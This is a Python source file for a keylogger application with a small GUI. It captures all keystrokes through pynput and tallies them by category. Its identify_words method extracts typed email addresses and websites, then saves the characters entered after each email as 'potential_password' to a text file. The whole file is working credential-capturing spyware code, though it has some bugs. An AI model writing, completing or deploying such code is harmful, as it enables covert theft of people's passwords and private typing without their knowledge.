from datetime import datetime, timedelta
import json
import threading
import keyboard
import os
import csv
from pynput.keyboard import Key, Listener, Controller
from tkinter import *
from tkinter import messagebox
import re


class KeyloggerApp:
    def __init__(self):
        self.is_logging = False
        self.listener = None
        self.start_time = None
        self.session_total = ''
        self.keylog_data = {}
        self.key_log = {}
        self.keystroke_data = {}
        self.running_text_job = None
        self.running_text_dots_index = 0
        self.stopwatch_running = False

        self.session_log = {
            'letters': {},
            'numbers': {},
            'words': {},
            'punctuation': {},
            'other': {}
        }

        self.load_data()
    
    def load_data(self):
        self.keylog_data = self.load_json('keylog.json')
        self.keystroke_data = self.load_json('keystroke_data.json')

    def load_json(self, filename):
        if os.path.exists(filename):
            print(f'Existing {filename} file detected, loading now')
            with open(filename, 'r') as file:
                try:
                    data = json.load(file)
                    print(f'Loaded {filename}')
                except json.JSONDecodeError:
                    print(f'There was an error decoding {filename}, initializing as empty')
                    data = {}
                    print(f'Created {filename}')
            return data
        else:
            print(f'No {filename} file detected, intializing now')
            with open(filename, 'w') as file:
                json.dump({}, file)
                print(f'Created {filename}')
            return {}
    
    def run_hotkey_listener(self):
        pass

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            self.listener = Listener(on_press = self.on_press)
            self.listener.start()
    
    def stop_logging(self):
        if self.is_logging:
            self.listener.stop()
            # Add everything here that stopping logging does
            self.is_logging = False
    
    def on_press(self, key):
        key_str = None
        
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)

        if key_str in self.key_log:
            self.key_log[key_str] += 1
        else:
            self.key_log[key_str] = 1
        
        if key_str.isalpha():
            self.keylog_data['letters'][key_str] = self.keylog_data['letters'].get(key_str, 0) + 1
            self.session_total += key_str
            print(self.session_total)
        elif key_str.isdigit():
            self.keylog_data['numbers'][key_str] = self.keylog_data['numbers'].get(key_str, 0) + 1 
            self.session_total += key_str
            print(self.session_total)
        elif key_str.endswith((',','.','?','!',';',':','@')):
            self.keylog_data['punctuation'][key_str] = self.keylog_data['punctuation'].get(key_str, 0) + 1
            self.session_total += key_str
            print(self.session_total)
        elif key_str.startswith('Key.enter'):
            self.session_total += key_str
            print(self.session_total)
        else:
            self.keylog_data['other'][key_str] = self.keylog_data['other'].get(key_str, 0) + 1
            print(key_str)


    # def on_release(self, key):
    #     if key == Key.esc:
    #         self.stop_logging()
    #         self.stop_running_status_label()


    def start_logging_event(self, running_status_label, stopwatch_label, root):
        self.key_log = {}
        self.start_logging() # Background key logging logic
        self.start_running_status_label(running_status_label, root)
        self.start_stopwatch(stopwatch_label, root)
        self.data_refresh(root)

    def stop_logging_event(self, running_status_label, stopwatch_label, root):
        self.stop_logging()

        # Cancel data saving
        if self.data_refresh_job is not None:
            root.after_cancel(self.data_refresh_job)
            self.data_refresh_job = None
        
        self.identify_words()

        self.stop_running_status_label(running_status_label, root)
        self.stop_stopwatch(stopwatch_label, root)

    def identify_words(self):
        session_total = self.session_total
        print(session_total)

        # Define regex patterns
        email_pattern = r'[a-zA-Z0-9._%+-]{1,10}@[a-zA-Z0-9.-]+\.(com|org|edu|gov|net|io|co|uk|us|ca)'
        word_pattern = r'(\w+)[.,!?;:\s]+'
        website_pattern = r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?=[^\w])'
        enter_key_pattern = r'Key\.enter'

        emails = re.findall(email_pattern, session_total)
        words = re.findall(word_pattern, session_total)
        websites = re.findall(website_pattern, session_total)

        potential_password = []
        for match in re.finditer(email_pattern, session_total):
            start_pos = match.end()
            # Search for the next occurrence of "Key.enter" after the email match
            key_enter_match = re.search(enter_key_pattern, session_total[start_pos:])

            if key_enter_match:
                # If "Key.enter" is found, get the substring from start_pos to "Key.enter"
                end_pos = start_pos + key_enter_match.start()
                next_chars = session_total[start_pos:end_pos]
            else:
                # If "Key.enter" is not found, get the next 16 characters
                next_chars = session_total[start_pos:start_pos + 16]

            potential_password.append(next_chars)

        # Write results to a file
        with open('session_total.txt', 'w') as f:
            f.write("Words:\n")
            f.write('\n'.join(words) + "\n")
            
            f.write("\nEmail Addresses:\n")
            f.write('\n'.join(emails) + "\n")
            
            f.write("\nWebsites:\n")
            f.write('\n'.join(websites) + "\n")
            
            f.write("\n16 Characters After Each Email:\n")
            f.write('\n'.join(potential_password) + "\n")




    def start_running_status_label(self, running_status_label, root):
        dots_states = ['','.','..','...']
        self.running_text_dots_index = (self.running_text_dots_index + 1) % 4
        running_status_label.configure(
            text=f'Running{dots_states[self.running_text_dots_index]}',
            text_color='green')
        self.running_text_job = root.after(1000, lambda: self.start_running_status_label(running_status_label, root))

    def stop_running_status_label(self, running_status_label, root):
        if self.running_text_job is not None:
            root.after_cancel(self.running_text_job)
            self.running_text_job = None
        running_status_label.configure(text='Stopped', text_color='red')
        root.after(3000, lambda: running_status_label.configure(text=''))

    def start_stopwatch(self, stopwatch_label, root):
        self.elapsed_time = timedelta(0)
        self.start_time = datetime.now()
        self.stopwatch_label = stopwatch_label
        self.stopwatch_running = True
        self.update_stopwatch()

    def update_stopwatch(self):
        if self.stopwatch_running:
            self.elapsed_time = datetime.now() - self.start_time
            formatted_time = str(self.elapsed_time).split('.')[0]
            self.stopwatch_label.configure(text=f'Session Time: {formatted_time}', text_color='white')
            self.stopwatch_label.after(1000, self.update_stopwatch)
    
    def stop_stopwatch(self, stopwatch_label, root):
        self.stopwatch_running = False
        
        def clear_label():
            stopwatch_label.configure(text='')
        
        root.after(5000, clear_label)

    def data_refresh(self, root):
        
        structured_data = {
            'totals': {
                'total_keys': 0,
                'total_word_count': self.keylog_data.get('total_word_count', 0) 
            },
            'letters': self.keylog_data.get('letters', {}),
            'numbers': self.keylog_data.get('numbers', {}),
            'words': self.keylog_data.get("words", {}),
            'punctuation': self.keylog_data.get('punctuation', {}),
            'other': self.keylog_data.get('other', {}),         
        }

        # Calculate total keys
        structured_data['totals']['total_keys'] = (
            sum(structured_data['letters'].values()) +
            sum(structured_data['numbers'].values()) +
            sum(structured_data['punctuation'].values()) +
            sum(structured_data['other'].values())
        )

        # Save
        with open('keylog.json', 'w') as f:
            json.dump(structured_data, f, indent=4)
        print(f'Refreshed keylog.json')

        if self.is_logging:
            self.data_refresh_job = root.after(1000, lambda: self.data_refresh(root))

    def reset_data(self):
        if os.path.exists('keylog.json'):
            try:
                with open('keylog.json', 'w') as f:
                    self.keylog_data = {}
            except json.JSONDecodeError:
                self.keylog_data = {}
        else:
            self.keylog_data = {}
        
        messagebox.showinfo('Success','All Data Erased')